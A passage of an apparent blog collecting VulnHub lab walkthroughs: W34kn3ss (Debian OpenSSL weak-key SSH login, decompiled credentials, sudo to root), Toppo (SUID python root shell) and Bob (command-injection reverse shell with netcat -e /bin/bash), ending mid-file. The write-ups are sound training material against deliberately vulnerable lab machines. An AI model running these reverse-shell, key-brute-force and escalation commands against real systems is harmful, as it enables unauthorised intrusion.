000000164:   301        9 L      28 W       320 Ch      <span class="s2">"uploads"</span>  
000000611:   301        9 L      28 W       317 Ch      <span class="s2">"test"</span>
000095524:   403        11 L     32 W       303 Ch      <span class="s2">"server-status"</span>
</code></pre></div></div>

<p>The test directory contains an image, but nothing important.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-2.png" alt="" /></p>

<p>I created a file with some extensions and ran wfuzz again.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'html'</span> <span class="o">&gt;</span> extensions.txt
root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'php'</span> <span class="o">&gt;&gt;</span> extensions.txt
root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'txt'</span> <span class="o">&gt;&gt;</span> extensions.txt

root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-z</span> file,extensions.txt http://192.168.179.155/FUZZ.FUZ2Z
...
000000043:   200        375 L    964 W      10918 Ch    <span class="s2">"index - html"</span>                                                                                      
000001097:   200        9 L      16 W       216 Ch      <span class="s2">"upload - php"</span>
</code></pre></div></div>

<p>The result of this enumeration returned an upload.php file, this likes interesting.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-3.png" alt="" /></p>

<p>I tested this to find a way to upload a file but nothing, this returns a base64 string I decoded it but the message doesn’t say anything important.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-4.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D
</code></pre></div></div>

<p>Listing the source code with the browser I saw a comment <strong>Not everything you see is real, maybe it’s just an illusion ;)</strong>, probably this is a rabbit hole.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-5.png" alt="" /></p>

<h3 id="ssl-enumeration">SSL Enumeration</h3>

<p>I connected with openssl on port 443 and discovered a domain name and an email.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.155:443 
CONNECTED<span class="o">(</span>00000003<span class="o">)</span>                   
Can<span class="s1">'t use SSL_get_servername     
depth=0 C = jo, ST = Jordan, L = Amman, O = weakness.jth, CN = weakness.jth, emailAddress = n30@weakness.jth
verify error:num=18:self signed certificate     
verify return:1 
...
</span></code></pre></div></div>

<p>I saved the domain name in the system hosts file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.155 weakness.jth'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>I requested this domain name with the browser and this redirected me to the following page.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-6.png" alt="" /></p>

<p>I ran wfuzz to find web directories again.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://weakness.jth/FUZZ
...
000001003:   301        9 L      28 W       314 Ch      <span class="s2">"private"</span>
</code></pre></div></div>

<p>The private directory contains a public key and a note contains a public key and a note.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-7.png" alt="" /></p>

<p>So I downloaded the public key, in the note we can see that the key was generated by a vulnerable version of openssl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://weakness.jth/private/files/mykey.pub
</code></pre></div></div>

<p><img src="/assets/images/w34kn3ss/screenshot-8.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit openssl 0.9.8c-1
<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
 Exploit Title                                                                                  |  Path
<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH         | linux/remote/5622.txt
OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH         | linux/remote/5720.py
OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH <span class="o">(</span>Ruby<span class="o">)</span>  | linux/remote/5632.rb
<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="openssl">OpenSSL</h3>

<p>This openssl version is vulnerable to <strong>Predictable PRNG Brute Force SSH</strong>, it’s that the debian openssl issue leads that there are only 65.536 possible ssh 
keys generated, cause the only entropy is the pid of the process generating the key.</p>

<p>Reading the exploit proof of concept, This indicates that you have to download a compressed file with all the generated keys, so I download it and decompress it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2

root@kali:~<span class="nv">$ </span><span class="nb">tar </span>xvf 5622.tar.bz2
</code></pre></div></div>

<p>Then I did a grep with the public key to find the private key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-lr</span> AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw rsa/
rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub
</code></pre></div></div>

<h3 id="access-via-ssh">Access via SSH</h3>

<p>I log in to SSH with the key found and I captured the first flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh n30@192.168.179.155 <span class="nt">-i</span> rsa/2048/4161de56829de2fe64b9055711f531c1-2537
Welcome to Ubuntu 18.04 LTS <span class="o">(</span>GNU/Linux 4.15.0-20-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">ls
</span>code  user.txt
n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
25e3cd678875b601425c9356c8039f68
</code></pre></div></div>

<p>In the n30’s home directory there’s a file called code, this is a compiled python file that generates a hash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30@W34KN3SS:~<span class="nv">$ </span>file code 
code: python 2.7 byte-compiled
n30@W34KN3SS:~<span class="nv">$ </span>python code
<span class="o">[</span>+]System Started at : Wed Oct 13 20:05:23 2021
<span class="o">[</span>+]This binary should generate unique <span class="nb">hash </span><span class="k">for </span>the hardcoded login info
<span class="o">[</span>+]Generating the <span class="nb">hash</span> ..
<span class="o">[</span>+]Your new <span class="nb">hash </span>is : fa82870b0487f9a92a4cc089e989f4e97a61a8da9fe1ff856c75ada3039030c3
<span class="o">[</span>+]Done
</code></pre></div></div>

<p>I Downloaded this file to the attacking machine to analyze it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-i</span> rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@192.168.179.155:code <span class="nb">.</span>
code                                                                     100% 1138   352.7KB/s   00:00
</code></pre></div></div>

<p>There’s a way to decompile these types of files, for this I used <strong>uncompyle2</strong>, you can dowanload it <a href="https://github.com/Mysterie/uncompyle2">here</a>, or use an online python <a href="https://www.toolnb.com/tools-lang-en/pyc.html">decompiler</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>uncompyle2 code 
<span class="c"># 2021.10.13 21:17:40 -05</span>
<span class="c"># Embedded file name: code.py</span>
import os
import socket
import <span class="nb">time
</span>import hashlib
print <span class="s1">'[+]System Started at : {0}'</span>.format<span class="o">(</span>time.ctime<span class="o">())</span>
print <span class="s1">'[+]This binary should generate unique hash for the hardcoded login info'</span>
print <span class="s1">'[+]Generating the hash ..'</span>
inf <span class="o">=</span> <span class="s1">''</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'n'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'0'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">':'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'d'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'M'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'A'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'S'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'D'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'N'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'B'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'B'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
hashf <span class="o">=</span> hashlib.sha256<span class="o">(</span>inf + time.ctime<span class="o">())</span>.hexdigest<span class="o">()</span>
print <span class="s1">'[+]Your new hash is : {0}'</span>.format<span class="o">(</span>hashf<span class="o">)</span>
print <span class="s1">'[+]Done'</span>
<span class="c"># okay decompyling code </span>
<span class="c"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span>
</code></pre></div></div>

<p>As we can see the source code is in plain text and was possible recover the n30’s credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30:dMASDNB!!#B!#!#33
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudoers-group">Sudoers Group</h3>

<p>As we can see, n30 belongs to the sudoers group, so I ran the following command and entered the password and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">sudo </span>su
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>n30: 
root@W34KN3SS:/home/n30# <span class="nb">cd 
</span>root@W34KN3SS:~# <span class="nb">ls
</span>root.txt
root@W34KN3SS:~# <span class="nb">cat </span>root.txt 
a1d2fab76ec6af9b651d4053171e042e
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Toppo 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The Machine isn’t hard to own and don’t require advanced exploitation.</p>

<p><strong>Author:</strong> Hadi Mene</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong><a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With nmap I discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1-255
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-07 12:40 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap scan report <span class="k">for </span>192.168.179.154
Host is up <span class="o">(</span>0.00070s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 08:00:27:CB:BD:36 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00029s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:F0:4D:8E <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Then, I did a full TCP port scan to discover open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p-</span> 192.168.179.154 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
48238/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Then I performed the version detection and OS, script scanning and traceroute on the target host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80,111,48238 192.168.179.154 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc <span class="o">(</span>DSA<span class="o">)</span>
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 <span class="o">(</span>RSA<span class="o">)</span>
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000) </span>
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37372/udp   status 
|   100024  1          48238/tcp   status 
|   100024  1          52388/udp6  status 
|_  100024  1          57788/tcp6  status
48238/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>In the web service, at first glance I didn’t find anything important, so I decided run wfuzz to find files and directories hidden.</p>

<p><img src="/assets/images/toppo/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.154/FUZZ
...
000000039:   301        9 L      28 W       316 Ch      <span class="s2">"img"</span>
000000201:   301        9 L      28 W       317 Ch      <span class="s2">"mail"</span>
000000259:   301        9 L      28 W       318 Ch      <span class="s2">"admin"</span>
000000550:   301        9 L      28 W       316 Ch      <span class="s2">"css"</span>
000000730:   301        9 L      28 W       319 Ch      <span class="s2">"manual"</span>
000000953:   301        9 L      28 W       315 Ch      <span class="s2">"js"</span>
000001481:   301        9 L      28 W       319 Ch      <span class="s2">"vendor"</span>
000003295:   200        21 L     172 W      1093 Ch     <span class="s2">"LICENSE"</span>
</code></pre></div></div>

<p>Listing the admin directory I found the notes.txt file, as we can see this contains a password, this possibly belongs to the ted user, since it’s included in the password.</p>

<p><img src="/assets/images/toppo/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/toppo/screenshot-3.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via ssh</h3>

<p>I tried to log in to the server via SSH with the user <strong>ted</strong> and password <strong>12345ted123</strong>, and the access was successful.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh ted@192.168.179.154             
ted@192.168.179.154<span class="s1">'s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$
</span></code></pre></div></div>

<p>Enumerating for SUID binaries, I found the python binary with this permission, we can abuse this to escalate our privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ted@Toppo:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null 
...
/usr/bin/python2.7
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID binary</h3>

<p>To get root I used the following python instruction, this imports the os module which allows you to run the execl() function, this subroutine runs an executable file indicated by the path, in this case the bash binary, this method was obtained from the <a href="https://gtfobins.github.io/gtfobins/python/#suid">GTFOBins</a> guide.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ted@Toppo:~<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import os; os.execl("/bin/bash","bash","-p")'</span>
bash-4.3# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ted<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ted<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ted<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,114<span class="o">(</span>bluetooth<span class="o">)</span>
bash-4.3# <span class="nb">whoami
</span>root

bash-4.3# <span class="nb">cd</span> /root
bash-4.3# <span class="nb">ls
</span>flag.txt
bash-4.3# <span class="nb">cat </span>flag.txt 
_________                                  
|  _   _  |                                 
|_/ | | <span class="se">\_</span>|.--.   _ .--.   _ .--.    .--.   
    | |  / .<span class="s1">'`\ \[ '</span>/<span class="s1">'`\ \[ '</span>/<span class="s1">'`\ \/ .'</span><span class="sb">`</span><span class="se">\ \ </span>
   _| |_ | <span class="se">\_</span>_. | | <span class="se">\_</span>_/ | | <span class="se">\_</span>_/ <span class="o">||</span> <span class="se">\_</span>_. | 
  |_____| <span class="s1">'.__.'</span>  | <span class="p">;</span>.__/  | <span class="p">;</span>.__/  <span class="s1">'.__.'</span>  
                 <span class="o">[</span>__|     <span class="o">[</span>__|              




Congratulations <span class="o">!</span> there is your flag : 0wnedlab<span class="o">{</span>p4ssi0n_c0me_with_pract1ce<span class="o">}</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Bob 1.0.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian.</p>

<p><strong>Author:</strong> c0rruptedb1t</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get the flag in /.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>I proceeded to detect the target host on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24          
 Currently scanning: Finished!   |   Screen View: Unique Hosts           
                                                                  
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.153 00:0c:29:0e:b0:d2      3     180  VMware, Inc.         
 192.168.179.254 00:50:56:e0:d4:3f      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I did a full TCP port scan with nmap to discover available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-T5</span> 192.168.179.153 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
80/tcp    open  http
25468/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Then I discovered the version of the services, OS detection , script scanning and traceroute on the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p80</span>,25468 192.168.179.153 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION                                      
80/tcp    open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>           
| http-methods:                                                          
|_  Supported Methods: OPTIONS HEAD GET POST                       
| http-robots.txt: 4 disallowed entries 
| /login.php /dev_shell.php /lat_memo.html 
|_/passwords.html
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Interacting with the web service I discovered a web site under construction.</p>

<p><img src="/assets/images/bob1/screenshot-1.png" alt="" /></p>

<p>If we notice in the nmap scan the robots.txt file was found which contains some web files especially one called <strong>dev_shell.php</strong> that looks interesting.</p>

<p><img src="/assets/images/bob1/screenshot-2.png" alt="" /></p>

<p>As we see this allows us executing some system commands but the cat command is not allowed, whit the following command I listed the sorce code of the dev_shell.php file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more dev_shell.php
</code></pre></div></div>

<p><img src="/assets/images/bob1/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/bob1/screenshot-4.png" alt="" /></p>

<p>Analyzing the source code we see an array of commands not allowed, then the strpos() function returns a message if exists a semicolon in the string, if not the explode() function breaks the string into an array, then into the if statement checks only the first position of the array for bad commands, these restrictions allow the attacker execute system commands.</p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="command-injection">Command Injection</h3>

<p>First we need set up a netcat listener, then execute the following netcat command to get a reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span><span class="o">&amp;&amp;</span>nc 192.168.179.1 443 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>
<p><img src="/assets/images/bob1/screenshot-5.png" alt="" /></p>

<p>Then I update it for a full TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.153] 32884
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
script <span class="nt">-qc</span> /bin/bash /dev/null
www-data@Milburg-High:/var/www/html<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
</code></pre></div></div>

<p>In elliot’s home directory I found a file with contains his password <strong>theadminisdumb</strong> and that of james <strong>Qwerty</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/elliot<span class="nv">$ </span><span class="nb">cat </span>theadminisdumb.txt 
The admin is dumb,
